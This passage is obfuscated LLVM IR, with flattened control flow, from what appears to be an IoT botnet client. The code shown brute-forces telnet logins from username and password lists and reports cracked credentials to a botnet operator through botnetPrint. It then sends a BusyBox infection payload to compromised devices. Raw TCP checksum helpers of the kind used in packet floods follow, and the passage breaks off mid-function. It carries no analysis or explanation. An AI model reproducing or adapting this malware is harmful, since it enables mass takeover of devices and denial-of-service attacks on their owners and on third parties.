  %401 = sext i32 %400 to i64
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %401
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %402, i32 0, i32 7
  %404 = load i32, i32* %403, align 16
  %405 = add i32 %404, 7
  %406 = zext i32 %405 to i64
  %407 = call i64 @time(i64* null) #3
  %408 = icmp slt i64 %406, %407
  %409 = select i1 %408, i32 -651978557, i32 1548756092
  store i32 %409, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  %411 = load i32, i32* %5, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %412
  call void @reset_telstate(%struct.telstate_t* %413)
  store i32 1548756092, i32* %switchVar
  br label %loopEnd

; <label>:414:                                    ; preds = %loopEntry
  store i32 -317523408, i32* %switchVar
  br label %loopEnd

; <label>:415:                                    ; preds = %loopEntry
  %416 = load i32, i32* %5, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %417
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %418, i32 0, i32 0
  %420 = load i32, i32* %419, align 16
  %421 = load i32, i32* %5, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %422
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %423, i32 0, i32 4
  %425 = load i8, i8* %424, align 2
  %426 = zext i8 %425 to i64
  %427 = getelementptr inbounds [0 x i8*], [0 x i8*]* @usernames, i64 0, i64 %426
  %428 = load i8*, i8** %427, align 8
  %429 = load i32, i32* %5, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %430
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %431, i32 0, i32 4
  %433 = load i8, i8* %432, align 2
  %434 = zext i8 %433 to i64
  %435 = getelementptr inbounds [0 x i8*], [0 x i8*]* @usernames, i64 0, i64 %434
  %436 = load i8*, i8** %435, align 8
  %437 = call i64 @strlen(i8* %436) #9
  %438 = call i64 @send(i32 %420, i8* %428, i64 %437, i32 16384)
  %439 = icmp slt i64 %438, 0
  %440 = select i1 %439, i32 2022437682, i32 462627819
  store i32 %440, i32* %switchVar
  br label %loopEnd

; <label>:441:                                    ; preds = %loopEntry
  %442 = load i32, i32* %5, align 4
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %443
  call void @reset_telstate(%struct.telstate_t* %444)
  store i32 -1904200318, i32* %switchVar
  br label %loopEnd

; <label>:445:                                    ; preds = %loopEntry
  %446 = load i32, i32* %5, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %447
  %449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %448, i32 0, i32 0
  %450 = load i32, i32* %449, align 16
  %451 = call i64 @send(i32 %450, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.93, i32 0, i32 0), i64 2, i32 16384)
  %452 = icmp slt i64 %451, 0
  %453 = select i1 %452, i32 -665109480, i32 -1987831897
  store i32 %453, i32* %switchVar
  br label %loopEnd

; <label>:454:                                    ; preds = %loopEntry
  %455 = load i32, i32* %5, align 4
  %456 = sext i32 %455 to i64
  %457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %456
  call void @reset_telstate(%struct.telstate_t* %457)
  store i32 -1904200318, i32* %switchVar
  br label %loopEnd

; <label>:458:                                    ; preds = %loopEntry
  %459 = load i32, i32* %5, align 4
  %460 = sext i32 %459 to i64
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %460
  call void @advance_state(%struct.telstate_t* %461, i32 4)
  store i32 -317523408, i32* %switchVar
  br label %loopEnd

; <label>:462:                                    ; preds = %loopEntry
  %463 = load i32, i32* %5, align 4
  %464 = sext i32 %463 to i64
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %464
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %465, i32 0, i32 0
  %467 = load i32, i32* %466, align 16
  %468 = load i32, i32* %3, align 4
  %469 = load i32, i32* %5, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %470
  %472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %471, i32 0, i32 9
  %473 = load i8*, i8** %472, align 8
  %474 = call i32 @read_until_response(i32 %467, i32 %468, i8* %473, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %475 = icmp ne i32 %474, 0
  %476 = select i1 %475, i32 193030686, i32 612724776
  store i32 %476, i32* %switchVar
  br label %loopEnd

; <label>:477:                                    ; preds = %loopEntry
  %478 = load i32, i32* %5, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %479
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %480, i32 0, i32 9
  %482 = load i8*, i8** %481, align 8
  %483 = call i32 @contains_fail(i8* %482)
  %484 = icmp ne i32 %483, 0
  %485 = select i1 %484, i32 206904807, i32 -1043958334
  store i32 %485, i32* %switchVar
  br label %loopEnd

; <label>:486:                                    ; preds = %loopEntry
  %487 = load i32, i32* %5, align 4
  %488 = sext i32 %487 to i64
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %488
  call void @advance_state(%struct.telstate_t* %489, i32 0)
  store i32 869179531, i32* %switchVar
  br label %loopEnd

; <label>:490:                                    ; preds = %loopEntry
  %491 = load i32, i32* %5, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %492
  call void @advance_state(%struct.telstate_t* %493, i32 5)
  store i32 869179531, i32* %switchVar
  br label %loopEnd

; <label>:494:                                    ; preds = %loopEntry
  store i32 -1904200318, i32* %switchVar
  br label %loopEnd

; <label>:495:                                    ; preds = %loopEntry
  %496 = load i32, i32* %5, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %497
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %498, i32 0, i32 7
  %500 = load i32, i32* %499, align 16
  %501 = add i32 %500, 3
  %502 = zext i32 %501 to i64
  %503 = call i64 @time(i64* null) #3
  %504 = icmp slt i64 %502, %503
  %505 = select i1 %504, i32 -33443454, i32 2004076529
  store i32 %505, i32* %switchVar
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  %507 = load i32, i32* %5, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %508
  call void @reset_telstate(%struct.telstate_t* %509)
  store i32 2004076529, i32* %switchVar
  br label %loopEnd

; <label>:510:                                    ; preds = %loopEntry
  store i32 -317523408, i32* %switchVar
  br label %loopEnd

; <label>:511:                                    ; preds = %loopEntry
  %512 = load i32, i32* %5, align 4
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %513
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %514, i32 0, i32 0
  %516 = load i32, i32* %515, align 16
  %517 = load i32, i32* %5, align 4
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %518
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %519, i32 0, i32 5
  %521 = load i8, i8* %520, align 1
  %522 = zext i8 %521 to i64
  %523 = getelementptr inbounds i32, i32* %42, i64 %522
  %524 = load i32, i32* %523, align 4
  %525 = sext i32 %524 to i64
  %526 = inttoptr i64 %525 to i8*
  %527 = load i32, i32* %5, align 4
  %528 = sext i32 %527 to i64
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %528
  %530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %529, i32 0, i32 5
  %531 = load i8, i8* %530, align 1
  %532 = zext i8 %531 to i64
  %533 = getelementptr inbounds i32, i32* %42, i64 %532
  %534 = load i32, i32* %533, align 4
  %535 = sext i32 %534 to i64
  %536 = inttoptr i64 %535 to i8*
  %537 = call i64 @strlen(i8* %536) #9
  %538 = call i64 @send(i32 %516, i8* %526, i64 %537, i32 16384)
  %539 = icmp slt i64 %538, 0
  %540 = select i1 %539, i32 1955251688, i32 -960578241
  store i32 %540, i32* %switchVar
  br label %loopEnd

; <label>:541:                                    ; preds = %loopEntry
  %542 = load i32, i32* %5, align 4
  %543 = sext i32 %542 to i64
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %543
  call void @reset_telstate(%struct.telstate_t* %544)
  store i32 -1904200318, i32* %switchVar
  br label %loopEnd

; <label>:545:                                    ; preds = %loopEntry
  %546 = load i32, i32* %5, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %547
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %548, i32 0, i32 0
  %550 = load i32, i32* %549, align 16
  %551 = call i64 @send(i32 %550, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.93, i32 0, i32 0), i64 2, i32 16384)
  %552 = icmp slt i64 %551, 0
  %553 = select i1 %552, i32 106443132, i32 -311485205
  store i32 %553, i32* %switchVar
  br label %loopEnd

; <label>:554:                                    ; preds = %loopEntry
  %555 = load i32, i32* %5, align 4
  %556 = sext i32 %555 to i64
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %556
  call void @reset_telstate(%struct.telstate_t* %557)
  store i32 -1904200318, i32* %switchVar
  br label %loopEnd

; <label>:558:                                    ; preds = %loopEntry
  %559 = load i32, i32* %5, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %560
  call void @advance_state(%struct.telstate_t* %561, i32 6)
  store i32 -317523408, i32* %switchVar
  br label %loopEnd

; <label>:562:                                    ; preds = %loopEntry
  %563 = load i32, i32* %5, align 4
  %564 = sext i32 %563 to i64
  %565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %564
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %565, i32 0, i32 0
  %567 = load i32, i32* %566, align 16
  %568 = load i32, i32* %3, align 4
  %569 = load i32, i32* %5, align 4
  %570 = sext i32 %569 to i64
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %570
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %571, i32 0, i32 9
  %573 = load i8*, i8** %572, align 8
  %574 = call i32 @read_until_response(i32 %567, i32 %568, i8* %573, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %575 = icmp ne i32 %574, 0
  %576 = select i1 %575, i32 883631623, i32 348981525
  store i32 %576, i32* %switchVar
  br label %loopEnd

; <label>:577:                                    ; preds = %loopEntry
  %578 = call i64 @time(i64* null) #3
  %579 = trunc i64 %578 to i32
  %580 = load i32, i32* %5, align 4
  %581 = sext i32 %580 to i64
  %582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %581
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %582, i32 0, i32 7
  store i32 %579, i32* %583, align 16
  %584 = load i32, i32* %5, align 4
  %585 = sext i32 %584 to i64
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %585
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %586, i32 0, i32 9
  %588 = load i8*, i8** %587, align 8
  %589 = call i32 @contains_fail(i8* %588)
  %590 = icmp ne i32 %589, 0
  %591 = select i1 %590, i32 910562608, i32 -245250954
  store i32 %591, i32* %switchVar
  br label %loopEnd

; <label>:592:                                    ; preds = %loopEntry
  %593 = load i32, i32* %5, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %594
  call void @advance_state(%struct.telstate_t* %595, i32 0)
  store i32 2100238843, i32* %switchVar
  br label %loopEnd

; <label>:596:                                    ; preds = %loopEntry
  %597 = load i32, i32* %5, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %598
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %599, i32 0, i32 9
  %601 = load i8*, i8** %600, align 8
  %602 = call i32 @contains_success(i8* %601)
  %603 = icmp ne i32 %602, 0
  %604 = select i1 %603, i32 990592515, i32 -1736099846
  store i32 %604, i32* %switchVar
  br label %loopEnd

; <label>:605:                                    ; preds = %loopEntry
  %606 = load i32, i32* %5, align 4
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %607
  %609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %608, i32 0, i32 3
  %610 = load i8, i8* %609, align 1
  %611 = zext i8 %610 to i32
  %612 = icmp eq i32 %611, 2
  %613 = select i1 %612, i32 1964105495, i32 -128539623
  store i32 %613, i32* %switchVar
  br label %loopEnd

; <label>:614:                                    ; preds = %loopEntry
  %615 = load i32, i32* %5, align 4
  %616 = sext i32 %615 to i64
  %617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %616
  call void @advance_state(%struct.telstate_t* %617, i32 7)
  store i32 -1283998245, i32* %switchVar
  br label %loopEnd

; <label>:618:                                    ; preds = %loopEntry
  %619 = load i32, i32* @switchCommStock, align 4
  %620 = load i32, i32* %5, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %621
  %623 = call i8* @get_telstate_host(%struct.telstate_t* %622)
  %624 = load i32, i32* %5, align 4
  %625 = sext i32 %624 to i64
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %625
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %626, i32 0, i32 4
  %628 = load i8, i8* %627, align 2
  %629 = zext i8 %628 to i64
  %630 = getelementptr inbounds [0 x i8*], [0 x i8*]* @usernames, i64 0, i64 %629
  %631 = load i8*, i8** %630, align 8
  %632 = load i32, i32* %5, align 4
  %633 = sext i32 %632 to i64
  %634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %633
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %634, i32 0, i32 5
  %636 = load i8, i8* %635, align 1
  %637 = zext i8 %636 to i64
  %638 = getelementptr inbounds i32, i32* %42, i64 %637
  %639 = load i32, i32* %638, align 4
  %640 = call i32 (i32, i8*, ...) @botnetPrint(i32 %619, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.94, i32 0, i32 0), i8* %623, i8* %631, i32 %639)
  %641 = load i32, i32* %5, align 4
  %642 = sext i32 %641 to i64
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %642
  call void @advance_state(%struct.telstate_t* %643, i32 7)
  store i32 -1283998245, i32* %switchVar
  br label %loopEnd

; <label>:644:                                    ; preds = %loopEntry
  store i32 -1350366063, i32* %switchVar
  br label %loopEnd

; <label>:645:                                    ; preds = %loopEntry
  %646 = load i32, i32* %5, align 4
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %647
  call void @reset_telstate(%struct.telstate_t* %648)
  store i32 -1350366063, i32* %switchVar
  br label %loopEnd

; <label>:649:                                    ; preds = %loopEntry
  store i32 2100238843, i32* %switchVar
  br label %loopEnd

; <label>:650:                                    ; preds = %loopEntry
  store i32 -1904200318, i32* %switchVar
  br label %loopEnd

; <label>:651:                                    ; preds = %loopEntry
  %652 = load i32, i32* %5, align 4
  %653 = sext i32 %652 to i64
  %654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %653
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %654, i32 0, i32 7
  %656 = load i32, i32* %655, align 16
  %657 = add i32 %656, 7
  %658 = zext i32 %657 to i64
  %659 = call i64 @time(i64* null) #3
  %660 = icmp slt i64 %658, %659
  %661 = select i1 %660, i32 56619355, i32 1334082308
  store i32 %661, i32* %switchVar
  br label %loopEnd

; <label>:662:                                    ; preds = %loopEntry
  %663 = load i32, i32* %5, align 4
  %664 = sext i32 %663 to i64
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %664
  call void @reset_telstate(%struct.telstate_t* %665)
  store i32 1334082308, i32* %switchVar
  br label %loopEnd

; <label>:666:                                    ; preds = %loopEntry
  store i32 -317523408, i32* %switchVar
  br label %loopEnd

; <label>:667:                                    ; preds = %loopEntry
  %668 = call i64 @time(i64* null) #3
  %669 = trunc i64 %668 to i32
  %670 = load i32, i32* %5, align 4
  %671 = sext i32 %670 to i64
  %672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %671
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %672, i32 0, i32 7
  store i32 %669, i32* %673, align 16
  %674 = load i32, i32* %5, align 4
  %675 = sext i32 %674 to i64
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %675
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %676, i32 0, i32 0
  %678 = load i32, i32* %677, align 16
  %679 = call i64 @send(i32 %678, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.95, i32 0, i32 0), i64 4, i32 16384)
  %680 = icmp slt i64 %679, 0
  %681 = select i1 %680, i32 -1063857844, i32 -674068390
  store i32 %681, i32* %switchVar
  br label %loopEnd

; <label>:682:                                    ; preds = %loopEntry
  store i32 -674068390, i32* %switchVar
  br label %loopEnd

; <label>:683:                                    ; preds = %loopEntry
  %684 = load i32, i32* %5, align 4
  %685 = sext i32 %684 to i64
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %685
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %686, i32 0, i32 0
  %688 = load i32, i32* %687, align 16
  %689 = call i64 @send(i32 %688, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.96, i32 0, i32 0), i64 7, i32 16384)
  %690 = icmp slt i64 %689, 0
  %691 = select i1 %690, i32 294824130, i32 -1345001751
  store i32 %691, i32* %switchVar
  br label %loopEnd

; <label>:692:                                    ; preds = %loopEntry
  store i32 -1345001751, i32* %switchVar
  br label %loopEnd

; <label>:693:                                    ; preds = %loopEntry
  %694 = load i32, i32* %5, align 4
  %695 = sext i32 %694 to i64
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %695
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %696, i32 0, i32 0
  %698 = load i32, i32* %697, align 16
  %699 = load i8*, i8** @BusyBoxPayload, align 8
  %700 = load i8*, i8** @BusyBoxPayload, align 8
  %701 = call i64 @strlen(i8* %700) #9
  %702 = call i64 @send(i32 %698, i8* %699, i64 %701, i32 16384)
  %703 = icmp slt i64 %702, 0
  %704 = select i1 %703, i32 -1400428418, i32 1337116694
  store i32 %704, i32* %switchVar
  br label %loopEnd

; <label>:705:                                    ; preds = %loopEntry
  %706 = load i32, i32* %5, align 4
  %707 = sext i32 %706 to i64
  %708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %707
  call void @reset_telstate(%struct.telstate_t* %708)
  store i32 -1904200318, i32* %switchVar
  br label %loopEnd

; <label>:709:                                    ; preds = %loopEntry
  %710 = load i32, i32* %5, align 4
  %711 = sext i32 %710 to i64
  %712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %711
  %713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %712, i32 0, i32 7
  %714 = load i32, i32* %713, align 16
  %715 = add i32 %714, 25
  %716 = zext i32 %715 to i64
  %717 = call i64 @time(i64* null) #3
  %718 = icmp slt i64 %716, %717
  %719 = select i1 %718, i32 -938525335, i32 1584602244
  store i32 %719, i32* %switchVar
  br label %loopEnd

; <label>:720:                                    ; preds = %loopEntry
  %721 = load i32, i32* %5, align 4
  %722 = sext i32 %721 to i64
  %723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %722
  %724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %723, i32 0, i32 3
  %725 = load i8, i8* %724, align 1
  %726 = zext i8 %725 to i32
  %727 = icmp ne i32 %726, 3
  %728 = select i1 %727, i32 -508528322, i32 -128137673
  store i32 %728, i32* %switchVar
  br label %loopEnd

; <label>:729:                                    ; preds = %loopEntry
  store i32 -128137673, i32* %switchVar
  br label %loopEnd

; <label>:730:                                    ; preds = %loopEntry
  %731 = load i32, i32* %5, align 4
  %732 = sext i32 %731 to i64
  %733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %732
  call void @reset_telstate(%struct.telstate_t* %733)
  store i32 1584602244, i32* %switchVar
  br label %loopEnd

; <label>:734:                                    ; preds = %loopEntry
  store i32 -317523408, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -317523408, i32* %switchVar
  br label %loopEnd

; <label>:735:                                    ; preds = %loopEntry
  store i32 -1904200318, i32* %switchVar
  br label %loopEnd

; <label>:736:                                    ; preds = %loopEntry
  %737 = load i32, i32* %5, align 4
  %738 = add nsw i32 %737, 1
  store i32 %738, i32* %5, align 4
  store i32 1797871014, i32* %switchVar
  br label %loopEnd

; <label>:739:                                    ; preds = %loopEntry
  store i32 -1531340756, i32* %switchVar
  br label %loopEnd

; <label>:740:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %739, %736, %735, %NewDefault, %734, %730, %729, %720, %709, %705, %693, %692, %683, %682, %667, %666, %662, %651, %650, %649, %645, %644, %618, %614, %605, %596, %592, %577, %562, %558, %554, %545, %541, %511, %510, %506, %495, %494, %490, %486, %477, %462, %458, %454, %445, %441, %415, %414, %410, %399, %398, %394, %390, %381, %366, %365, %361, %350, %349, %345, %341, %340, %323, %319, %308, %274, %273, %264, %263, %262, %258, %254, %249, %226, %225, %200, %199, %198, %193, %184, %179, %156, %147, %127, %118, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %LeafBlock7, %NodeBlock9, %NodeBlock11, %NodeBlock13, %102, %95, %87, %82, %81, %80, %79, %78, %70, %69, %66, %52, %47, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @srand(i32) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 1418457287, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1418457287, label %6
    i32 2073068478, label %11
    i32 -2143079361, label %20
    i32 1508854125, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  %10 = select i1 %9, i32 2073068478, i32 1508854125
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @rand_cmwc()
  %13 = urem i32 %12, 26
  %14 = add i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  store i8 %15, i8* %19, align 1
  store i32 -2143079361, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %5, align 4
  store i32 1418457287, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %20, %11, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 -229175677, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -229175677, label %6
    i32 -352370590, label %10
    i32 2011438404, label %19
    i32 670227172, label %23
    i32 -2075360849, label %30
    i32 -1687621375, label %31
    i32 -1424941490, label %36
    i32 -621691955, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  %9 = select i1 %8, i32 -352370590, i32 2011438404
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sub nsw i32 %17, 2
  store i32 %18, i32* %4, align 4
  store i32 -229175677, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 0
  %22 = select i1 %21, i32 670227172, i32 -2075360849
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i16*, i16** %3, align 8
  %25 = bitcast i16* %24 to i8*
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i64
  %28 = load i64, i64* %5, align 8
  %29 = add i64 %28, %27
  store i64 %29, i64* %5, align 8
  store i32 -2075360849, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 -1687621375, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = icmp ne i64 %33, 0
  %35 = select i1 %34, i32 -1424941490, i32 -621691955
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i64, i64* %5, align 8
  %38 = and i64 %37, 65535
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = add i64 %38, %40
  store i64 %41, i64* %5, align 8
  store i32 -1687621375, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 %43, -1
  %45 = trunc i64 %44 to i16
  ret i16 %45

loopEnd:                                          ; preds = %36, %31, %30, %23, %19, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
